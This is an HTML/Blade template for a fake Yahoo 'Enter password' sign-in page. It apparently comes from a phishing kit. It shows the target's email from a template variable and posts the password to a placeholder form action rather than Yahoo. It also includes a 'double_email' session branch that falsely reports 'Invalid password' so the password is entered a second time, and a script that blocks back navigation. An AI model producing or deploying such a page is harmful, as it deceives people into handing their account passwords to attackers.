
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Yahoo - login</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="files/yahoo.ico">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script type="text/javascript">function preventBack(){window.history.forward();}setTimeout("preventBack()", 0); window.onunload = function () { null }; </script> <script type="text/javascript" src="assets/js/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
        <style>

            .navbar-brand {
                margin-top: 10px;
                margin-left: 35px;
            }

            .col-lg-3 {
                margin-top: 20px;
                margin-right: 345px;
            }

            .card {
                width: 360px;
                border: 0;
                box-shadow: 0 2px 4px 0 rgba(181,181,181,.7);
                border-top: 1px solid #f1f1f5;
            }

            .card-body {
                padding: 0px;
            }

            .card-body > img {
                padding-top: 28px;
            }

            .card-body > p {
                color: #26282a;
                font-weight: 400;
                font-size: .95353rem;
            }

            .card-body > .text-title {
                font-size: 1.27647rem;
                font-weight: 600;
            }

            form {
                padding: 30px;
                margin-top: 20px;
            }

            label {
                font-size: .80588rem;
                color: #262626;
            }

            .form-control {
                padding: 0px;
                border-top-width: 0;
                border-left-width: 0;
                border-right-width: 0;
                -webkit-border-radius: 0;
            }

            .form-control:focus {
                box-shadow: none;
                background-color: transparent;
            }

            .btn {
                background: #188fff;
                border: 1px solid #188fff;
                border-radius: 1.17647rem;
                padding: .64706rem 0;
            }

            .btn:focus {
                background: #003abc;
                border-color: #003abc;
                box-shadow: none;
                outline: none;
            }

            .forgot {
                font-size: .82353rem;
                margin-top: 130px;
            }

            .forgot > a {
                color: #39f;
                background: transparent;
                border-color: transparent;
            }

            @media screen and (max-width: 768px) {
                .navbar {
                    display: none;
                }

                .col-lg-3 {
                    margin-top: 5px;
                    margin-right: 5px;

                }

                .card {
                    border: none;
                    box-shadow: none;
                }

                form {      
                    padding: 20px;
                }

                .forgot {
                    font-size: .82353rem;
                    margin-top: 380px;
                }
            }
        </style>
    </head>
    <body>

        <nav class="navbar navbar-expand-sm">
            <a class="navbar-brand" href="#">
                <img src="assets/email-assets/logo-yahoo.png" alt="Logo" height="36">
            </a>
        </nav>

        <div class="container-fluid">
            <div class="row d-flex align-items-end justify-content-end">
                <div class="col-lg-3 col-md-3 col-sm-12">
                    <div class="card">
                        <div class="card-body text-center">
                            <img src="assets/email-assets/logo-yahoo.png" alt="Logo" height="56">
                             
                            <p class="mt-3" id="email" name="email" >{{ $email }} </p>
                            <p class="text-title mb-0">Enter password</p>
                            <p class="mt-0">to finish sign in</p>
                            
            
                           <form method="post" action="@form_action_page('email')" class="text-left">
                                <div class="form-group">
                                    
                                    <label for="password">Password</label>
                                    <input type="password" class="form-control" placeholder="Password" id="password" name="password" required>
                                </div>
                                <button type="submit" class="btn btn-primary btn-block" name="submit" value="">Next</button>
                            </form>
                            <p>Sign in to proceed to {app_name}</p>
                            @if (isset($_SESSION['double_email']))
                                <font color=red>Invalid password, please try again. </font>
                            @endif
                            <p class="forgot"><a href="#">Forgot password?</a></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            $(function() {
                $('label').css('visibility', 'hidden')

                $(document).on('focus', '#password', function() {
                    $('label').css('visibility', 'visible').hide().fadeIn('slow')
                    $(this).attr('placeholder', '')
                })
            })
        </script>
    </body>
</html>